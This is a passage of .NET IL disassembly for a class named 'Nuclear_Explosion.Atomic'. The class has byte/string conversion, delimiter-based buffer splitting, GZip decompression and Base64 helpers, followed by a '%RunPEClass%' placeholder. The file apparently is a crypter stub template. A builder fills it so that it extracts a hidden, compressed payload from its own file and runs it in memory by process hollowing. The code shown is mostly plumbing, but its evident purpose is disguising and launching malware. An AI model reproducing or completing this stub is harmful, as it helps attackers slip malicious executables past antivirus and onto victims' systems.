    IL_0000:  nop
    IL_0001:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_Default()
    IL_0006:  ldarg.1
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000c:  stloc.0
    IL_000d:  br.s       IL_000f

    IL_000f:  ldloc.0
    IL_0010:  ret
  } // end of method Atomic::SB

  .method public instance string  BS(uint8[] b) cil managed
  {
    // Code size       17 (0x11)
    .maxstack  2
    .locals init (string V_0)
    IL_0000:  nop
    IL_0001:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_Default()
    IL_0006:  ldarg.1
    IL_0007:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_000c:  stloc.0
    IL_000d:  br.s       IL_000f

    IL_000f:  ldloc.0
    IL_0010:  ret
  } // end of method Atomic::BS

  .method public instance class [mscorlib]System.Array 
          fx(uint8[] b,
             string WRD) cil managed
  {
    // Code size       149 (0x95)
    .maxstack  6
    .locals init (class [mscorlib]System.Array V_0,
             class [mscorlib]System.Collections.Generic.List`1<uint8[]> V_1,
             class [mscorlib]System.IO.MemoryStream V_2,
             class [mscorlib]System.IO.MemoryStream V_3,
             string[] V_4)
    IL_0000:  nop
    IL_0001:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<uint8[]>::.ctor()
    IL_0006:  stloc.1
    IL_0007:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_000c:  stloc.2
    IL_000d:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0012:  stloc.3
    IL_0013:  ldarg.0
    IL_0014:  ldarg.1
    IL_0015:  call       instance string Nuclear_Explosion.Atomic::BS(uint8[])
    IL_001a:  ldarg.2
    IL_001b:  ldc.i4.m1
    IL_001c:  ldc.i4.0
    IL_001d:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0022:  stloc.s    V_4
    IL_0024:  ldloc.2
    IL_0025:  ldarg.1
    IL_0026:  ldc.i4.0
    IL_0027:  ldloc.s    V_4
    IL_0029:  ldc.i4.0
    IL_002a:  ldelem.ref
    IL_002b:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0030:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0035:  nop
    IL_0036:  ldloc.3
    IL_0037:  ldarg.1
    IL_0038:  ldloc.s    V_4
    IL_003a:  ldc.i4.0
    IL_003b:  ldelem.ref
    IL_003c:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0041:  ldarg.2
    IL_0042:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0047:  add.ovf
    IL_0048:  ldarg.1
    IL_0049:  ldlen
    IL_004a:  conv.i4
    IL_004b:  ldloc.s    V_4
    IL_004d:  ldc.i4.0
    IL_004e:  ldelem.ref
    IL_004f:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_0054:  ldarg.2
    IL_0055:  callvirt   instance int32 [mscorlib]System.String::get_Length()
    IL_005a:  add.ovf
    IL_005b:  sub.ovf
    IL_005c:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0061:  nop
    IL_0062:  ldloc.1
    IL_0063:  ldloc.2
    IL_0064:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
    IL_0069:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<uint8[]>::Add(!0)
    IL_006e:  nop
    IL_006f:  ldloc.1
    IL_0070:  ldloc.3
    IL_0071:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
    IL_0076:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<uint8[]>::Add(!0)
    IL_007b:  nop
    IL_007c:  ldloc.2
    IL_007d:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0082:  nop
    IL_0083:  ldloc.3
    IL_0084:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
    IL_0089:  nop
    IL_008a:  ldloc.1
    IL_008b:  callvirt   instance !0[] class [mscorlib]System.Collections.Generic.List`1<uint8[]>::ToArray()
    IL_0090:  stloc.0
    IL_0091:  br.s       IL_0093

    IL_0093:  ldloc.0
    IL_0094:  ret
  } // end of method Atomic::fx

  .method public instance uint8[]  Decompress(uint8[] data) cil managed
  {
    // Code size       129 (0x81)
    .maxstack  4
    .locals init (uint8[] V_0,
             class [mscorlib]System.IO.MemoryStream V_1,
             class [System]System.IO.Compression.GZipStream V_2,
             class [mscorlib]System.IO.MemoryStream V_3,
             uint8[] V_4,
             int32 V_5,
             bool V_6)
    IL_0000:  nop
    IL_0001:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0006:  stloc.1
    IL_0007:  ldloc.1
    IL_0008:  ldarg.1
    IL_0009:  ldc.i4.0
    IL_000a:  ldarg.1
    IL_000b:  ldlen
    IL_000c:  conv.i4
    IL_000d:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0012:  nop
    IL_0013:  ldloc.1
    IL_0014:  ldc.i4.0
    IL_0015:  conv.i8
    IL_0016:  callvirt   instance void [mscorlib]System.IO.MemoryStream::set_Position(int64)
    IL_001b:  nop
    IL_001c:  ldloc.1
    IL_001d:  ldc.i4.0
    IL_001e:  ldc.i4.1
    IL_001f:  newobj     instance void [System]System.IO.Compression.GZipStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                       valuetype [System]System.IO.Compression.CompressionMode,
                                                                                       bool)
    IL_0024:  stloc.2
    IL_0025:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_002a:  stloc.3
    IL_002b:  ldc.i4.s   64
    IL_002d:  newarr     [mscorlib]System.Byte
    IL_0032:  stloc.s    V_4
    IL_0034:  ldc.i4.m1
    IL_0035:  stloc.s    V_5
    IL_0037:  ldloc.2
    IL_0038:  ldloc.s    V_4
    IL_003a:  ldc.i4.0
    IL_003b:  ldloc.s    V_4
    IL_003d:  ldlen
    IL_003e:  conv.i4
    IL_003f:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_0044:  stloc.s    V_5
    IL_0046:  br.s       IL_0064

    IL_0048:  ldloc.3
    IL_0049:  ldloc.s    V_4
    IL_004b:  ldc.i4.0
    IL_004c:  ldloc.s    V_5
    IL_004e:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                               int32,
                                                                               int32)
    IL_0053:  nop
    IL_0054:  ldloc.2
    IL_0055:  ldloc.s    V_4
    IL_0057:  ldc.i4.0
    IL_0058:  ldloc.s    V_4
    IL_005a:  ldlen
    IL_005b:  conv.i4
    IL_005c:  callvirt   instance int32 [System]System.IO.Compression.GZipStream::Read(uint8[],
                                                                                       int32,
                                                                                       int32)
    IL_0061:  stloc.s    V_5
    IL_0063:  nop
    IL_0064:  ldloc.s    V_5
    IL_0066:  ldc.i4.0
    IL_0067:  cgt
    IL_0069:  stloc.s    V_6
    IL_006b:  ldloc.s    V_6
    IL_006d:  brtrue.s   IL_0048

    IL_006f:  ldloc.2
    IL_0070:  callvirt   instance void [mscorlib]System.IO.Stream::Close()
    IL_0075:  nop
    IL_0076:  ldloc.3
    IL_0077:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
    IL_007c:  stloc.0
    IL_007d:  br.s       IL_007f

    IL_007f:  ldloc.0
    IL_0080:  ret
  } // end of method Atomic::Decompress

  .method public instance object  Encode(string Input) cil managed
  {
    // Code size       22 (0x16)
    .maxstack  2
    .locals init (object V_0)
    IL_0000:  nop
    IL_0001:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0006:  ldarg.1
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000c:  call       string [mscorlib]System.Convert::ToBase64String(uint8[])
    IL_0011:  stloc.0
    IL_0012:  br.s       IL_0014

    IL_0014:  ldloc.0
    IL_0015:  ret
  } // end of method Atomic::Encode

  .method public instance object  Decode(string Input) cil managed
  {
    // Code size       22 (0x16)
    .maxstack  2
    .locals init (object V_0)
    IL_0000:  nop
    IL_0001:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0006:  ldarg.1
    IL_0007:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_000c:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
    IL_0011:  stloc.0
    IL_0012:  br.s       IL_0014

    IL_0014:  ldloc.0
    IL_0015:  ret
  } // end of method Atomic::Decode

  .method private specialname instance void 
          '_Lambda$__R32-2'(object a0) cil managed
  {
    .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
    .custom instance void [mscorlib]System.Diagnostics.DebuggerHiddenAttribute::.ctor() = ( 01 00 00 00 ) 
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  castclass  uint8[]
    IL_0007:  call       instance void Nuclear_Explosion.Atomic::data(uint8[])
    IL_000c:  ret
  } // end of method Atomic::'_Lambda$__R32-2'

} // end of class Nuclear_Explosion.Atomic

%RunPEClass%

.class private auto ansi sealed '<PrivateImplementationDetails>'
       extends [mscorlib]System.Object
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .class explicit ansi sealed nested private '__StaticArrayInitTypeSize=6'
         extends [mscorlib]System.ValueType
  {
    .pack 1
    .size 6
  } // end of class '__StaticArrayInitTypeSize=6'

  .class explicit ansi sealed nested private '__StaticArrayInitTypeSize=43'
         extends [mscorlib]System.ValueType
  {
    .pack 1
    .size 43
  } // end of class '__StaticArrayInitTypeSize=43'

  .field static assembly initonly valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=6' '03C7F4E8FB359AEC0EEF0814B66A704FC43FB3A8' at I_000084C4
  .field static assembly initonly valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=43' '5B1EE7CAD3DFF220A95D1D6B91435D9E1520AC41' at I_000084CC
} // end of class '<PrivateImplementationDetails>'


// =============================================================

.data cil I_000084C4 = bytearray (
                 01 01 01 01 01 01) 
.data cil I_000084CA = int8[2]
.data cil I_000084CC = bytearray (
                 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
                 01 01 01 01 01 01 01 01 01 01 01) 
// *********** DISASSEMBLY COMPLETE ***********************
